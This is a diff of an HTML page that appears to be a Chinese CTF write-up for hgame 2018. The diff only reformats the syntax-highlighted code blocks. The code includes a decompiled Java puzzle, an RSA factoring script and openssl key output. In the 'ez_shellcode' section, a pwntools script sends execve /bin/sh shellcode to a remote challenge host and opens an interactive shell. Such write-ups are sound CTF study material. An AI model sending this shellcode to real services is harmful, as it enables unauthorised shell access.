@@ -164,12 +164,12 @@
 <h2 id="ez-shellcode">ez_shellcode</h2>
 <p>既然是直接执行，那找一个就好了</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
-</span><span style="color:#c0c5ce;">r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">111.230.149.72</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">10004</span><span style="color:#c0c5ce;">)
-</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">r.recv
-payload = &quot;</span><span style="color:#96b5b4;">\x6a\x0b</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x58</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x99</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x2f\x73\x68</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x62\x69\x6e</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe3</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span style="color:#c0c5ce;">&quot; +&quot;</span><span style="color:#96b5b4;">\x53</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe1</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\xcd\x80</span><span style="color:#c0c5ce;">&quot;
-r.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(payload)
-r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5ce;">()
+<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
+r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">111.230.149.72</span><span style="color:#c0c5ce;">&quot;,</span><span style="color:#d08770;">10004</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">r.recv</span><span style="color:#c0c5ce;">
+payload = &quot;</span><span style="color:#96b5b4;">\x6a\x0b</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x58</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x99</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x2f\x73\x68</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x68\x2f\x62\x69\x6e</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe3</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x52</span><span style="color:#c0c5ce;">&quot; +&quot;</span><span style="color:#96b5b4;">\x53</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\x89\xe1</span><span style="color:#c0c5ce;">&quot;+&quot;</span><span style="color:#96b5b4;">\xcd\x80</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
+r.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(payload)</span><span style="color:#c0c5ce;">
+r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
 </span></code></pre><h2 id="ez-bash-jail">ez bash jail</h2>
 <p>根据视频教程</p>
 <p><img src="https://CSUwangj.github.io/hgame2018-week2bu-fen-wp/snipaste20180214_171547.png" alt="ez bash jail" /></p>
@@ -193,60 +193,60 @@ r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5
 <p>解压出来的文件拿反编译器http://www.javadecompilers.com/搞一下</p>
 <p>有用的代码为</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#65737e;">/*
- * Decompiled with CFR 0_123.
- */
-</span><span style="color:#b48ead;">package </span><span style="color:#c0c5ce;">GUI;
-
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">Component</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">LayoutManager</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.event.</span><span style="color:#ebcb8b;">ActionEvent</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.event.</span><span style="color:#ebcb8b;">ActionListener</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JButton</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JFrame</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JPanel</span><span style="color:#c0c5ce;">;
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#c0c5ce;">;
-
-</span><span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">hgameGUI
-        </span><span style="color:#b48ead;">extends </span><span style="color:#a3be8c;">JFrame </span><span style="color:#eff1f5;">{
-    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_WIDTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">;
-    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_HEIGHT </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">;
-
-    </span><span style="color:#b48ead;">public </span><span style="color:#8fa1b3;">hgameGUI</span><span style="color:#eff1f5;">() {
-        </span><span style="color:#bf616a;">super</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Welcome to Hgame!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">setSize</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">);
-        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag1 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">i&#39;m flag</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag2 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">i&#39;m flag, too.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag3 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">RU kidding me? I&#39;m the true flag!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag4 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">UR wrong, I&#39;m the true flag!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-        </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;"> flagtext </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Want flag? Try upstairs.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-        </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;"> flag </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;">();
-        flag.</span><span style="color:#bf616a;">setLayout</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">5</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">1</span><span style="color:#eff1f5;">));
-        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag1);
-        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag2);
-        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag3);
-        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag4);
-        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flagtext);
-        flag1.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">118</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-                }
-        );
-        flag2.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">54</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-                }
-        );
-        flag3.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">29</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-                }
-        );
-        flag4.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{
-                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">89</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);
-                }
-        );
-        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag);
-    }
-}
+<code><span style="color:#65737e;">/*</span><span style="color:#65737e;">
+ * Decompiled with CFR 0_123.</span><span style="color:#65737e;">
+ */</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">package </span><span style="color:#c0c5ce;">GUI;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">Component</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.</span><span style="color:#ebcb8b;">LayoutManager</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.event.</span><span style="color:#ebcb8b;">ActionEvent</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">java.awt.event.</span><span style="color:#ebcb8b;">ActionListener</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JButton</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JFrame</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JPanel</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">javax.swing.</span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">public class </span><span style="color:#ebcb8b;">hgameGUI</span><span style="color:#eff1f5;">
+        </span><span style="color:#b48ead;">extends </span><span style="color:#a3be8c;">JFrame </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_WIDTH </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">;</span><span style="color:#eff1f5;">
+    </span><span style="color:#b48ead;">private static final int </span><span style="color:#eff1f5;">DEFAULT_HEIGHT </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">;</span><span style="color:#eff1f5;">
+</span><span style="color:#eff1f5;">
+    </span><span style="color:#b48ead;">public </span><span style="color:#8fa1b3;">hgameGUI</span><span style="color:#eff1f5;">() {</span><span style="color:#eff1f5;">
+        </span><span style="color:#bf616a;">super</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Welcome to Hgame!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">setSize</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">300</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">200</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag1 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">i&#39;m flag</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag2 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">i&#39;m flag, too.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag3 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">RU kidding me? I&#39;m the true flag!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;"> flag4 </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JButton</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">UR wrong, I&#39;m the true flag!</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;"> flagtext </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JTextArea</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">Want flag? Try upstairs.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+        </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;"> flag </span><span style="color:#c0c5ce;">= </span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">JPanel</span><span style="color:#eff1f5;">();</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">setLayout</span><span style="color:#eff1f5;">(</span><span style="color:#b48ead;">new </span><span style="color:#ebcb8b;">GridLayout</span><span style="color:#eff1f5;">(</span><span style="color:#d08770;">5</span><span style="color:#eff1f5;">, </span><span style="color:#d08770;">1</span><span style="color:#eff1f5;">));</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag1);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag2);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag3);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag4);</span><span style="color:#eff1f5;">
+        flag.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flagtext);</span><span style="color:#eff1f5;">
+        flag1.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">118</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        flag2.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">54</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        flag3.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">29</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        flag4.</span><span style="color:#bf616a;">addActionListener</span><span style="color:#eff1f5;">(</span><span style="color:#bf616a;">event </span><span style="color:#b48ead;">-&gt; </span><span style="color:#eff1f5;">{</span><span style="color:#eff1f5;">
+                    flagtext.</span><span style="color:#bf616a;">setText</span><span style="color:#eff1f5;">(</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">89</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#eff1f5;">);</span><span style="color:#eff1f5;">
+                }</span><span style="color:#eff1f5;">
+        );</span><span style="color:#eff1f5;">
+        </span><span style="color:#bf616a;">this</span><span style="color:#eff1f5;">.</span><span style="color:#bf616a;">add</span><span style="color:#eff1f5;">(flag);</span><span style="color:#eff1f5;">
+    }</span><span style="color:#eff1f5;">
+}</span><span style="color:#c0c5ce;">
 </span></code></pre>
 <p>智障的我反应了半天才明白这是IP地址</p>
 <p>遍历一下顺序查一下，在中国的一个IP里找到</p>
@@ -256,24 +256,24 @@ r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5
 <h2 id="easy-rsa">easy rsa</h2>
 <p>明明还是偶尔摸摸ACM的，二分都想不起来……MDZZ</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">N = </span><span style="color:#d08770;">10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001
-</span><span style="color:#c0c5ce;">e = </span><span style="color:#d08770;">65537
-</span><span style="color:#c0c5ce;">c = </span><span style="color:#d08770;">4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891
-</span><span style="color:#c0c5ce;">h = </span><span style="color:#d08770;">211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750
-
-</span><span style="color:#c0c5ce;">low = </span><span style="color:#d08770;">1
-</span><span style="color:#c0c5ce;">high = h//</span><span style="color:#d08770;">2 
-</span><span style="color:#c0c5ce;">mid =</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">((low+high))//</span><span style="color:#d08770;">2
-
-</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">low&lt;high:
-	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">low*(h-low)  &gt; N:
-		high = mid-</span><span style="color:#d08770;">1
-	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
-		low = mid + </span><span style="color:#d08770;">1
-	</span><span style="color:#c0c5ce;">mid = (low+high)//</span><span style="color:#d08770;">2
-
-</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(low)
-</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(h-low)
+<code><span style="color:#c0c5ce;">N = </span><span style="color:#d08770;">10385112853503545283534594498014002163302819192542881359629016178651814593394538223939733674125477453748418677846543570433509186453439897628509042367641638605796280506469598857872127102183624493512082415420093824666579257184064851925863532407038708153173813845163607930388067232852387553655027755138043051251085946275767001373277444643651026212284925970808939348126454571156523402419571304104957238600724334148041629955456548891850609245486162713434748801968838458008730625275388077430783612116161245037630984479400721315318755404657093206825883572149393481806067157147431981573823960963614146686202457034323040706001</span><span style="color:#c0c5ce;">
+e = </span><span style="color:#d08770;">65537</span><span style="color:#c0c5ce;">
+c = </span><span style="color:#d08770;">4371976065894333890314975885075127128451240983808800709698046359245834252220415066013588488225793488033803390795656718853587692177687489853479502247266771924035749805299269602527272036788769904108885493823764984982805025952459173246366939243972669582338728034363614943062106220697944193226897767645789368465460202024200438535770983989035642434091720020123447189714932941203953201421143816856602410516207702904806903435163191348277867475813985765685033173827201970396908439360218409562692753257235084893548449865848486681931258855329384534422245333790248671083002562017871712806386748477524316776702973435067495735891</span><span style="color:#c0c5ce;">
+h = </span><span style="color:#d08770;">211473031829143387075248424832701297198713292770838284307849674781204968609248808096119074157099909881957829793545784295167214864644080464847006389628006758327477845870101535232054809595189429534377867001767649036319119343001102771623484473596258682675319189568166030200094562890253995876322745344347924616750</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+low = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
+high = h//</span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">
+mid =</span><span style="color:#bf616a;">int</span><span style="color:#c0c5ce;">((low+high))//</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">low&lt;high:</span><span style="color:#c0c5ce;">
+	</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">low*(h-low)  &gt; N:</span><span style="color:#c0c5ce;">
+		high = mid-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
+	</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
+		low = mid + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
+	mid = (low+high)//</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(low)</span><span style="color:#c0c5ce;">
+</span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(h-low)</span><span style="color:#c0c5ce;">
 </span></code></pre>
 <p>这样就有p/q了</p>
 <p>后来发现这出题人一开始应该没这样想</p>
@@ -281,20 +281,20 @@ r.</span><span style="color:#bf616a;">interactive</span><span style="color:#c0c5
 <h2 id="the-same-simple-rsa">The same simple RSA</h2>
 <p>先读一下key咯</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> openssl rsa</span><span style="color:#bf616a;"> -pubin -in</span><span style="color:#c0c5ce;"> pubkey.pem</span><span style="color:#bf616a;"> -text -modulus
-Public-Key:</span><span style="color:#c0c5ce;"> (256 bit)
-</span><span style="color:#bf616a;">Modulus:
-    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
-    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
-    be:30:dd
-Exponent:</span><span style="color:#c0c5ce;"> 65537 (0x10001)
-</span><span style="color:#bf616a;">Modulus</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
-</span><span style="color:#bf616a;">-----BEGIN</span><span style="color:#c0c5ce;"> PUBLIC KEY-----
-</span><span style="color:#bf616a;">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
-yigb/+l/vjDdAgMBAAE</span><span style="color:#c0c5ce;">=
-</span><span style="color:#bf616a;">-----END</span><span style="color:#c0c5ce;"> PUBLIC KEY-----
-</span><span style="color:#bf616a;">writing</span><span style="color:#c0c5ce;"> RSA key
-
+<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> openssl rsa</span><span style="color:#bf616a;"> -pubin -in</span><span style="color:#c0c5ce;"> pubkey.pem</span><span style="color:#bf616a;"> -text -modulus</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Public-Key:</span><span style="color:#c0c5ce;"> (256 bit)</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Modulus:</span><span style="color:#c0c5ce;">
+    </span><span style="color:#bf616a;">00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><span style="color:#c0c5ce;">
+    </span><span style="color:#bf616a;">1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><span style="color:#c0c5ce;">
+    </span><span style="color:#bf616a;">be:30:dd</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Exponent:</span><span style="color:#c0c5ce;"> 65537 (0x10001)</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">Modulus</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><span style="color:#c0c5ce;">
+</span><span style="color:#bf616a;">-----BEGIN</span><span style="color:#c0c5ce;"> PUBLIC KEY-----</span><span style="color:#c0c5ce;">
